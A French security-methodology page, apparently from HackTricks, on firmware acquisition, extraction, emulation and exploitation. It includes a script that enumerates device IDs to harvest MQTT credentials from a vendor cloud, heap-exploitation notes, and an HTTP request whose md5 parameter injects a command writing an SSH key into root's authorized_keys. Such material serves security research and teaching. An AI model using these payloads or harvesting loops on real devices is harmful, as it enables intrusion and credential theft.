# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources associées

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels avec lesquels les utilisateurs interagissent. Il est stocké dans une mémoire permanente, ce qui permet à l’appareil d’accéder aux instructions indispensables dès sa mise sous tension et de lancer le système d’exploitation. L’examen et la modification éventuelle du firmware sont des étapes essentielles pour repérer les vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d’informations**

La **collecte d’informations** est une première étape essentielle pour comprendre la composition d’un appareil et les technologies qu’il utilise. Elle consiste à recueillir des données sur :

- L’architecture du CPU et le système d’exploitation qu’il exécute
- Les spécificités du bootloader
- La disposition du matériel et les fiches techniques
- Les métriques de la base de code et l’emplacement des sources
- Les bibliothèques externes et les types de licences
- L’historique des mises à jour et les certifications réglementaires
- Les schémas d’architecture et de flux
- Les évaluations de sécurité et les vulnérabilités recensées

À cette fin, les outils d’**open-source intelligence (OSINT)** sont précieux, tout comme l’analyse des composants logiciels open source disponibles, au moyen d’examens manuels et automatisés. Des outils comme [Coverity Scan](https://scan.coverity.com) et [Semmle’s LGTM](https://lgtm.com/#explore) offrent une analyse statique gratuite qui peut aider à repérer d’éventuels problèmes.

## **Obtention du firmware**

Il existe plusieurs façons d’obtenir le firmware, chacune présentant un niveau de complexité différent :

- L’obtenir **directement** auprès de la source (développeurs, fabricants)
- Le **compiler** en suivant les instructions fournies
- Le **télécharger** depuis les sites d’assistance officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- Accéder directement au **cloud storage** à l’aide d’outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **mises à jour** à l’aide de techniques man-in-the-middle
- L’**extraire** de l’appareil via des connexions comme **UART**, **JTAG** ou **PICit**
- **Sniffer** les demandes de mise à jour dans les communications de l’appareil
- Identifier et utiliser des **endpoints de mise à jour codés en dur**
- En faire un **dump** depuis le bootloader ou le réseau
- **Retirer et lire** la puce de stockage, en dernier recours, avec les outils matériels appropriés

### Journaux UART uniquement : forcer un root shell via l’environnement U-Boot dans la flash

Si les données RX UART sont ignorées (journaux uniquement), vous pouvez tout de même forcer un shell d’init en **modifiant hors ligne le blob de l’environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Faire un dump de la SPI flash avec une pince SOIC-8 et un programmateur (3,3 V) :
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localisez la partition env de U-Boot, modifiez `bootargs` pour y inclure `init=/bin/sh`, puis **recalculez le CRC32 de l’environnement U-Boot** pour le blob.
3. Reflashez uniquement la partition env et redémarrez ; un shell devrait apparaître sur l’UART.

Cette méthode est utile sur les appareils embarqués dont le shell du bootloader est désactivé, mais dont la partition env peut être modifiée via un accès externe à la flash.

## Analyse du firmware

Maintenant que vous **avez le firmware**, vous devez en extraire des informations pour savoir comment le traiter. Voici différents outils que vous pouvez utiliser :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` : si elle est faible, l’image n’est probablement pas chiffrée. Si elle est élevée, elle est probablement chiffrée (ou compressée d’une manière ou d’une autre).

Vous pouvez également utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le fichier.

### Récupération du système de fichiers

Avec les outils mentionnés précédemment, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier portant le nom du type de système de fichiers**, qui est généralement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **ne reconnaît pas la signature du système de fichiers**. Dans ce cas, utilisez binwalk pour **trouver le décalage du système de fichiers et extraire le système de fichiers compressé** du binaire, puis **extrayez manuellement** le système de fichiers en fonction de son type en suivant les étapes ci-dessous.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Exécutez la commande **dd** suivante pour extraire le système de fichiers Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l’exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d’archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus consiste à utiliser divers outils pour analyser et extraire des données utiles de l’image du firmware.

### Outils d’analyse initiale

Un ensemble de commandes est fourni pour inspecter initialement le fichier binaire (désigné par `<bin>`). Ces commandes permettent d’identifier les types de fichiers, d’extraire des chaînes de caractères, d’analyser les données binaires et de comprendre les détails des partitions et du système de fichiers :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Pour évaluer le niveau de chiffrement de l’image, on vérifie l’**entropie** avec `binwalk -E <bin>`. Une faible entropie suggère une absence de chiffrement, tandis qu’une entropie élevée indique un possible chiffrement ou une compression.

Pour extraire les **fichiers intégrés**, il est recommandé d’utiliser des outils et des ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour inspecter les fichiers.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d’après son type (par exemple, squashfs, ubifs). Cependant, lorsque **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de l’absence d’octets magiques, une extraction manuelle est nécessaire. Il faut alors utiliser `binwalk` pour repérer l’offset du système de fichiers, puis la commande `dd` pour en extraire les données :

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Ensuite, selon le type de système de fichiers (par exemple, squashfs, cpio, jffs2, ubifs), différentes commandes permettent d’en extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. L’analyse porte sur les daemons réseau non sécurisés, les identifiants codés en dur, les points de terminaison API, les fonctionnalités des serveurs de mise à jour, le code non compilé, les scripts de démarrage et les binaires compilés, qui sont analysés hors ligne.

**Emplacements clés** et **éléments** à inspecter :

- **etc/shadow** et **etc/passwd** pour les identifiants des utilisateurs
- Certificats et clés SSL dans **etc/ssl**
- Fichiers de configuration et scripts présentant d’éventuelles vulnérabilités
- Binaires embarqués à analyser plus en détail
- Serveurs web et binaires courants des appareils IoT

Plusieurs outils aident à découvrir des informations sensibles et des vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Vérifications de sécurité des binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés à la recherche de vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows aident à repérer les binaires non protégés susceptibles d’être exploités.

## Récupération de la configuration cloud et des identifiants MQTT via des jetons d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration spécifique à chaque appareil depuis un point de terminaison cloud de la forme suivante :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) et représenté en hexadécimal majuscule

Cette conception permet à quiconque connaissant un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, qui révèle souvent les identifiants MQTT en texte brut et les préfixes des topics.

Procédure pratique :

1) Extraire le deviceId des journaux de démarrage UART

- Connectez un adaptateur UART 3,3 V (TX/RX/GND) et capturez les journaux :

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Recherchez les lignes qui affichent le modèle d’URL de configuration cloud et l’adresse du broker, par exemple :

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Récupérer STATIC_KEY et l’algorithme du token à partir du firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmer l’algorithme (p. ex., MD5(deviceId||STATIC_KEY)).
- Calculer le token dans Bash et mettre le digest en majuscules :

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Récupérer la configuration cloud et les identifiants MQTT

- Composer l’URL et récupérer le JSON avec curl ; l’analyser avec jq pour en extraire les secrets :

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Exploiter MQTT en clair et des ACL de topic faibles (si présentes)

- Utiliser les identifiants récupérés pour s’abonner aux topics de maintenance et rechercher des événements sensibles :

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Énumérer les ID d’appareils prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type du fournisseur, suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les ID candidats, générer des tokens et récupérer des configurations par programmation :

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Obtenez toujours une autorisation explicite avant de tenter une énumération à grande échelle.
- Privilégiez l’émulation ou l’analyse statique pour récupérer des secrets sans modifier le matériel cible, lorsque c’est possible.

L’émulation du firmware permet d’effectuer une **analyse dynamique** du fonctionnement d’un appareil ou d’un programme donné. Cette approche peut se heurter à des dépendances matérielles ou architecturales, mais le transfert du système de fichiers racine ou de binaires spécifiques vers un appareil doté d’une architecture et d’un boutisme identiques, comme un Raspberry Pi, ou vers une machine virtuelle préconfigurée, peut faciliter les tests.

### Émulation de binaires individuels

Pour examiner des programmes isolés, il est essentiel d’identifier le boutisme et l’architecture du processeur utilisés par le programme.

#### Exemple avec l’architecture MIPS

Pour émuler un binaire destiné à l’architecture MIPS, utilisez la commande suivante :

```bash
file ./squashfs-root/bin/busybox
```

Et pour installer les outils d’émulation nécessaires :

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Pour MIPS (big-endian), on utilise `qemu-mips`, et pour les binaires little-endian, on choisira `qemu-mipsel`.

#### Émulation de l’architecture ARM

Pour les binaires ARM, le processus est similaire : l’émulateur `qemu-arm` est utilisé.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d’autres facilitent l’émulation complète du firmware, en automatisant le processus et en facilitant l’analyse dynamique.

### Reconstruction des systèmes de fichiers root scindés et vérifiés pour l’émulation

Si un superbloc SquashFS est lisible, mais que les offsets des inodes, des répertoires ou de la table des fragments sont impossibles, ne modifiez pas immédiatement `unsquashfs`. Faites de la rétro-ingénierie sur le binaire de démarrage précoce et reproduisez le graphe de périphériques bloc qu’il crée : les systèmes embarqués peuvent exposer une partition root nominale, mais construire le véritable système de fichiers avec un mapping `dm-linear` qui ajoute des secteurs empruntés à une autre partition. Les vérifications du seul superbloc peuvent réussir alors que tous les blocs de métadonnées suivants sont décalés.<sup>[[9]](#references)</sup>

Reproduisez exactement l’arithmétique du firmware. Identifiez notamment si les longueurs sont exprimées en octets, en secteurs de 512 octets ou en pages de 4 Kio ; reproduisez les décalages de bits et les troncatures dans leur ordre d’origine ; et tenez compte des régions de fin dépendantes de la banque dans les configurations A/B. Par exemple, `(partition_bytes >> 12) << 3` tronque d’abord à une limite de 4 Kio, puis exprime le résultat en secteurs de 512 octets ; remplacer cette opération par `partition_bytes // 512` peut décaler l’étendue ajoutée de quelques kilo-octets et corrompre toutes les tables SquashFS suivantes.<sup>[[9]](#references)</sup>

Voici un processus de validation utile :<sup>[[9]](#references)</sup>

1. Récupérez dans le binaire du vérificateur/init la source de chaque segment `dm-linear`, son secteur de départ et sa longueur.
2. Concaténez ou mappez les étendues sans modifier la sémantique de leur alignement.
3. Si l’extraction échoue toujours, effectuez une recherche dans une petite fenêtre autour de la limite prédite et exigez plusieurs structures de métadonnées valides consécutives, au lieu de vous fier à un superbloc simplement plausible.
4. Exécutez un `unsquashfs` non modifié sur l’image reconstruite ; le parcours réussi de tous les répertoires et fragments est une preuve plus solide que `unsquashfs -stat`.

#### Remplacement de dm-verity contrôlé par l’analyste

Lorsque l’analyste contrôle le noyau QEMU, l’initramfs et les disques virtuels, il est possible de démarrer un root modifié en remplaçant le PID 1 de vérification du fournisseur par un petit init lié statiquement. Il s’agit d’une **substitution de la chaîne de démarrage en laboratoire**, et non d’une compromission de dm-verity, de sa signature RSA, de Secure Boot ou d’une clé scellée au TPM.<sup>[[9]](#references)</sup>

L’init de remplacement doit reproduire les étapes opérationnelles du chemin de démarrage d’origine : monter `devtmpfs`, appeler `setsid()`, connecter `/dev/console` aux descripteurs de fichiers 0–2, monter `/proc` et `/sys`, attendre le périphérique bloc fourni, monter en lecture seule le root modifié, détacher les pseudo-systèmes de fichiers de l’ancien root, déplacer le nouveau montage sur `/`, appeler `chroot`, puis exécuter (`execve()`) le `/sbin/init` d’origine du firmware. Détacher `/dev`, `/proc` et `/sys` **avant** `MS_MOVE` évite de détacher par erreur les points de montage appartenant au nouveau root.<sup>[[9]](#references)</sup>

Séparez l’état modifiable du périphérique du root immuable modifié. Un overlay qcow2 peut préserver l’état LVM du disque d’origine tandis qu’un second disque virtio en lecture seule fournit le SquashFS modifié :<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Débogage de l’état de l’image hors ligne

Inspectez l’état persistant en dehors de l’invité lorsque des démarrages lents, des scripts de démarrage destructeurs ou des journaux de console peu fiables masquent la panne. Ne montez jamais un overlay utilisé par une VM en cours d’exécution ; exposez-le avec `qemu-nbd`, limitez la détection LVM à la partition NBD prévue et désactivez le groupe de volumes avant de le déconnecter.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Pour isoler les pannes de manière reproductible, écrivez des fichiers marqueurs horodatés sur un volume stable accessible en écriture et vérifiez-les hors ligne ; `/dev/kmsg`, les FIFO et les consoles éphémères peuvent produire des faux négatifs en raison de la limitation du débit ou de l’arrêt prématuré du processus. Comparez également les interfaces exactes entre les couches avant de modifier du code sans rapport : `uname -r` par rapport à `/lib/modules/`, les fonctionnalités ext4 sur disque par rapport à la configuration du kernel, et la génération de `libGL` de Mesa par rapport à l’ABI du driver DRI et aux noms de drivers dérivés du PCI. Un composant peut être présent et même se charger correctement avec `dlopen()` tout en restant inutilisable, car son consommateur attend une ABI différente.<sup>[[9]](#references)</sup>

## Dynamic Analysis in Practice

À ce stade, un environnement de périphérique réel ou émulé est utilisé pour l’analyse. Il est essentiel de conserver un accès shell au système d’exploitation et au système de fichiers. L’émulation ne reproduit pas toujours parfaitement les interactions matérielles, ce qui peut nécessiter de redémarrer l’émulateur à l’occasion. L’analyse doit réexaminer le système de fichiers, exploiter les pages web exposées et les services réseau, et explorer les vulnérabilités du bootloader. Les tests d’intégrité du firmware sont essentiels pour identifier d’éventuelles vulnérabilités de backdoor.

## Runtime Analysis Techniques

L’analyse runtime consiste à interagir avec un processus ou un binaire dans son environnement d’exécution, à l’aide d’outils comme gdb-multiarch, Frida et Ghidra pour définir des points d’arrêt et identifier des vulnérabilités par le fuzzing et d’autres techniques.

Pour les cibles embarquées sans debugger complet, **copiez un `gdbserver` lié statiquement** sur le périphérique et connectez-vous à distance :<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Cartographie des messages Zigbee / radio-co-processor

Sur les hubs IoT, la pile RF est souvent répartie entre un **MCU radio** et un processus Linux en espace utilisateur. Voici une méthode utile pour cartographier le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** transmise par voie hertzienne
2. **Analyseur côté contrôleur** sur le MCU radio
3. **Protocole série/UART textuel ou TLV** transmis à Linux (par exemple `/dev/tty*`)
4. **Dispatcher applicatif** dans le daemon principal
5. **Gestionnaire / machine à états spécifique au protocole**

Cette architecture fournit deux cibles à analyser au lieu d’une. Si le contrôleur convertit les trames radio binaires en un protocole textuel tel que `Group,Command,arg1,arg2,...`, retrouvez :

- Les **groupes de messages** et les tables de dispatch
- Les messages qui peuvent provenir du **réseau** par opposition à ceux émis par le contrôleur lui-même
- Les champs discriminateurs exacts **spécifiques au fabricant** (par exemple `manufacturer_code` et `cluster_command` de Zigbee)
- Les gestionnaires accessibles uniquement pendant le **commissionnement**, la découverte ou les phases de téléchargement du firmware/modèle

Pour Zigbee en particulier, capturez le trafic d’appairage et vérifiez si la cible utilise encore la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’écoute du trafic de commissionnement peut révéler la **Network Key**. Les install codes de Zigbee 3.0 réduisent cette exposition ; vérifiez donc si l’appareil testé les impose réellement.

### Gestionnaires de protocoles spécifiques au fabricant et accessibilité contrôlée par FSM

Les commandes Zigbee/ZCL spécifiques aux fabricants sont souvent une meilleure cible que les clusters standardisés, car elles alimentent du **code d’analyse personnalisé** et des **FSM** internes dont la validation a été moins éprouvée.<sup>[[8]](#references)</sup>

Méthode pratique :

- Remontez le dispatcher de commandes jusqu’à trouver le **gestionnaire réservé au fabricant**.
- Retrouvez les tables d’**états** de la FSM, d’**événements**, de **vérifications**, d’**actions** et d’**états suivants**.
- Repérez les **états transitoires** qui avancent automatiquement, ainsi que les branches de nouvelle tentative ou d’erreur qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Confirmez quels échanges légitimes du protocole sont nécessaires pour placer le daemon dans l’état vulnérable, au lieu de supposer que le gestionnaire bogué est toujours accessible.

Pour les protocoles sensibles au timing, la relecture de paquets depuis un framework Python peut être trop lente. Une approche plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une pile de niveau industriel, afin d’exposer les bons **endpoints**, **attributs** et timings de commissionnement.

### Classe de bugs liés aux téléchargements fragmentés dans les daemons embarqués

Une classe de bugs récurrente dans les firmwares concerne les téléchargements fragmentés de blobs/modèles/configurations :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **locaux au paquet** contrôlés par l’attaquant, tels que `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier que la taille ne dépasse pas la **taille allouée à l’origine**.

Un attaquant peut ainsi envoyer :

- Un premier fragment valide avec une taille totale déclarée **faible** pour provoquer une petite allocation sur le tas.
- Un fragment ultérieur avec l’**offset attendu**, mais un `chunk_len` plus grand.
- Une taille locale au paquet falsifiée qui satisfait les vérifications récentes tout en provoquant un dépassement du tampon initialement alloué.

Lorsque le chemin vulnérable est protégé par la logique de commissionnement, l’exploitation doit inclure suffisamment d’**émulation de l’appareil** pour amener la cible dans l’état attendu de téléchargement de modèle ou de blob avant d’envoyer les fragments malformés.

### Déclencheurs de `free()` pilotés par le protocole

Dans les daemons embarqués, le moyen le plus simple de déclencher l’exploitation des métadonnées du tas n’est souvent pas « d’attendre le nettoyage », mais de **forcer la gestion d’erreur du protocole** :<sup>[[8]](#references)</sup>

- Envoyez des fragments de suivi malformés pour faire passer la FSM dans des états de **nouvelle tentative** ou d’**erreur**.
- Dépassez le seuil de nouvelles tentatives afin que le daemon **réinitialise le contexte** et libère le tampon corrompu.
- Utilisez ce `free()` prévisible pour déclencher des primitives côté allocateur avant que le processus ne plante pour d’autres raisons.

Cette méthode est particulièrement utile contre les allocateurs de type **musl/uClibc/dlmalloc** sous Linux embarqué, où la corruption des métadonnées de chunk peut transformer la logique unlink/unbin en primitive d’écriture. Une approche stable consiste à corrompre un **champ de taille** pour rediriger le parcours de l’allocateur vers de **faux chunks placés dans le tampon ayant subi le dépassement**, au lieu d’écraser directement les pointeurs de bin réels et de faire planter le processus.

## Exploitation binaire et preuve de concept

Développer une PoC pour les vulnérabilités identifiées exige une compréhension approfondie de l’architecture cible et de la programmation dans des langages de bas niveau. Les protections d’exécution binaire sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins uClibc (Linux embarqué)

- **Fastbins et consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation plus importante effectuée ultérieurement peut déclencher `__malloc_consolidate()` ; tout faux chunk doit donc passer les vérifications (taille cohérente, `fd = 0` et chunks adjacents considérés comme « utilisés »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si ASLR est activé, mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire sont stables. Vous pouvez cibler une zone qui ressemble déjà à un en-tête de chunk valide pour faire aboutir une allocation fastbin sur une **table de pointeurs de fonctions**.
- **NUL qui arrête l’analyseur :** lors de l’analyse du JSON, un `\x00` dans le payload peut arrêter l’analyse tout en préservant les octets contrôlés par l’attaquant qui suivent, pour un pivot de pile/une chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut placer du shellcode exécutable dans un mapping connu et lui transférer l’exécution.

## Systèmes d’exploitation prêts à l’emploi pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour tester la sécurité des firmwares, avec les outils nécessaires.

## OS prêts à l’emploi pour analyser les firmwares

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution conçue pour vous aider à évaluer la sécurité et à effectuer des tests d’intrusion sur des appareils de l’Internet des objets (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation de test de sécurité embarquée basé sur Ubuntu 18.04, préchargé avec des outils de test de sécurité des firmwares.

## Attaques par downgrade de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un fabricant met en œuvre des vérifications de signature cryptographique pour les images de firmware, la **protection contre le retour à une version antérieure (downgrade)** est souvent omise. Si le chargeur de démarrage ou de récupération vérifie uniquement la signature à l’aide d’une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image installée, un attaquant peut légitimement installer un **ancien firmware vulnérable doté d’une signature toujours valide** et ainsi réintroduire des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Déroulement typique de l’attaque :

1. **Obtenir une ancienne image signée**
   * La récupérer sur le portail de téléchargement public, le CDN ou le site de support du fabricant.
   * L’extraire des applications mobiles/de bureau associées (par exemple dans `assets/firmware/` d’un APK Android).
   * La récupérer dans des dépôts tiers comme VirusTotal, des archives Internet, des forums, etc.
2. **Envoyer ou fournir l’image à l’appareil** par n’importe quel canal de mise à jour exposé :
   * Interface Web, API d’application mobile, USB, TFTP, MQTT, etc.
   * De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent une récupération ou une mise à niveau.
3. Après le downgrade, exploiter une vulnérabilité corrigée dans une version plus récente (par exemple un filtre contre l’injection de commandes ajouté ultérieurement).
4. Facultativement, réinstaller la dernière image ou désactiver les mises à jour afin d’éviter d’être détecté une fois la persistance obtenue.

### Exemple : injection de commandes après un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est concaténé directement à une commande shell sans être assaini, ce qui permet d’injecter des commandes arbitraires (ici, d’activer l’accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre élémentaire de caractères, mais l’absence de protection contre la rétrogradation rend ce correctif inopérant.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis des applications mobiles

De nombreux fabricants intègrent des images complètes du firmware à leurs applications mobiles compagnons, afin que l’application puisse mettre à jour l’appareil via Bluetooth/Wi-Fi. Ces paquets sont généralement stockés sans chiffrement dans l’APK/APEX, sous des chemins tels que `assets/fw/` ou `res/raw/`. Des outils comme `apktool`, `ghidra` ou même la simple commande `unzip` permettent d’extraire des images signées sans toucher au matériel physique.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Contournement de l’anti-rollback limité à l’updater dans les conceptions à slots A/B

Certains fabricants implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS via CAN, une commande de récupération ou un agent OTA en userspace). Si le **bootloader** vérifie ensuite uniquement la signature/CRC de l’image et fait confiance à la table de partitions ou aux métadonnées du slot, la protection contre le rollback peut toujours être contournée.<sup>[[7]](#references)</sup>

Conception faible typique :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **ratchet de sécurité** / compteur monotone.
- L’updater compare le ratchet de l’image à une valeur stockée dans le stockage persistant et rejette les images signées plus anciennes.
- Le bootloader ne parse **pas** ce ratchet et vérifie uniquement l’en-tête, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est stockée séparément dans une table de partitions ou un compteur de génération par slot et n’est **pas liée cryptographiquement** au digest exact du firmware validé.

